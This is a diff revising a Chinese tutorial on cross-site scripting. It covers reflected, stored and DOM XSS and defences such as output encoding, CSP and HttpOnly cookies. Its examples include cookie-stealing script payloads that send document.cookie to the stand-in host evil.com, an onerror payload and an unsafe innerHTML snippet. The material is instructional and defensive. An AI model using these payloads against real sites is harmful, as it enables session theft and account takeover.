@@ -24,9 +24,9 @@ date: 2026-08-07
 
 经典场景（搜索框）：
 
-1. 受害者点击恶意链接：`https://example.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>`
-2. 服务器把 `q` 的值**原样**拼进页面：`<p>您搜索了：<script>...</script></p>`
-3. 浏览器执行了 `<script>`——把 Cookie 发给攻击者。
+1. 受害者点击恶意链接：`http://victim.com/search?q=<script>document.location='//evil.com/?c='+document.cookie</script>`
+2. 服务器把 `q`（搜索关键词）的值**原样**拼进页面：`<p>您搜索的是：<script>…</script></p>`
+3. 浏览器执行了注入的 `<script>`——把 Cookie 发给攻击者。
 
 **特征**：注入代码不持久，**一次请求一次执行**——需要「诱导受害者点击恶意链接」（钓鱼、发链接）。
 
@@ -38,7 +38,7 @@ date: 2026-08-07
 
 经典场景（评论区）：
 
-1. 攻击者在评论框提交：`<script>document.location='https://evil.com?c='+document.cookie</script>`
+1. 攻击者在评论框提交：`<script>new Image().src='//evil.com/?c='+document.cookie</script>`
 2. 服务器把评论存进数据库。
 3. **每个访问该页面的用户**，浏览器都执行这段脚本——攻击者批量收割 Cookie。
 
@@ -52,14 +52,15 @@ date: 2026-08-07
 
 经典场景（前端路由/查询参数）：
 
-```js
-let name = new URLSearchParams(location.search).get('name');
-document.getElementById('greet').innerHTML = '你好，' + name;   // 危险！
+```javascript
+// DOM XSS：前端从 URL 参数读数据，直接拼进 innerHTML
+const name = new URLSearchParams(location.search).get("name");
+document.getElementById("welcome").innerHTML = "你好，" + name;  // 危险！
 ```
 
 如果 `name` 是 `<img src=x onerror=alert(1)>`，`innerHTML` 把它当 HTML 渲染——`onerror` 触发脚本。
 
-**特征**：**服务器完全不知情**（攻击发生在客户端 DOM 操作），传统 WAF/服务端过滤看不见它。检测更难、防御要改前端代码。<span class="marginnote">DOM XSS 是三种里「最现代、最难防」的：<strong>它绕过了服务器（请求与响应都正常），问题全在浏览器里的 `innerHTML`、`eval`、`document.write` 等「把数据当代码」的 API</strong>。防御不能靠服务端，必须在前端「把输出编码 + 用安全 API（textContent 而非 innerHTML）」。</span>
+**特征**：**服务器完全不知情**（攻击发生在客户端 DOM 操作），传统 WAF/服务端过滤看不见它。检测更难、防御要改前端代码。<span class="marginnote">DOM XSS 是三种里「最现代、最难防」的：<strong>它绕过了服务器（请求与响应都正常），问题全在浏览器里的 `innerHTML`、`document.write()`、`eval()` 等「把数据当代码」的 API</strong>。防御不能靠服务端，必须在前端「把输出编码 + 用安全 API（textContent 而非 innerHTML）」。</span>
 
 ## 4 公式解析：XSS 的统一成因
 
@@ -70,7 +71,7 @@ $$
 三步拆解这条「XSS 通用公式」：
 
 - **第一步，数据来源**：用户输入、URL 参数、数据库内容、第三方 API——都可能是不可信的。
-- **第二步，渲染路径**：`innerHTML`、`document.write`、`eval`、模板字符串拼接——把数据「当代码」插入。
+- **第二步，渲染路径**：`innerHTML`、`outerHTML`、`document.write()`、模板字符串拼接——把数据「当代码」插入。
 - **第三步，执行上下文**：浏览器在页面源（可信域）上下文执行脚本——**脚本拥有该域的全部权限（Cookie、localStorage、DOM）**。
 
 ## 5 防御 XSS：输出编码 + CSP
@@ -78,10 +79,10 @@ $$
 XSS 防御的核心是**「永远把不可信数据当数据，不当代码」**：
 
 - **输出编码（Output Encoding）**：根据渲染上下文编码——HTML 实体编码、JS 字符串转义、URL 编码、属性编码。框架（React 默认转义、Django 自动转义）已内置。
-- **CSP（Content Security Policy）**：HTTP 响应头声明「哪些脚本可信」——`default-src 'self'` 禁止内联脚本，即使注入成功也不执行。
-- **HttpOnly Cookie**：`HttpOnly` 标记的 Cookie **JavaScript 读不到**——偷 Cookie 的 XSS 失效（但防不了其他利用）。
+- **CSP（Content Security Policy）**：HTTP 响应头声明「哪些脚本可信」——`script-src` 指令禁止内联脚本，即使注入成功也不执行。
+- **HttpOnly Cookie**：带 `HttpOnly` 属性的 Cookie **JavaScript 读不到**——偷 Cookie 的 XSS 失效（但防不了其他利用）。
 - **输入验证**：白名单校验（纵深防御补充，不是主防线）。
-- **安全 API**：`textContent` 而非 `innerHTML`、不用 `eval`。
+- **安全 API**：用 `textContent` 而非 `innerHTML`、不用 `eval()`。
 
 **分层**：输出编码是「根治」（正确编码就让注入无法成为代码），CSP 是「兜底」（编码漏了也拦截执行），HttpOnly 是「减损」（即使执行也偷不到 Cookie）。<span class="marginnote">CSP 是 XSS 防御的「第二层铠甲」：<strong>即使输出编码漏了、脚本被注入了，CSP 也会阻止浏览器执行它</strong>——「允许执行的脚本白名单」把攻击脚本挡在门外。现代 Web 应用的标配是「输出编码 + CSP + HttpOnly」三层叠加。</span>
 
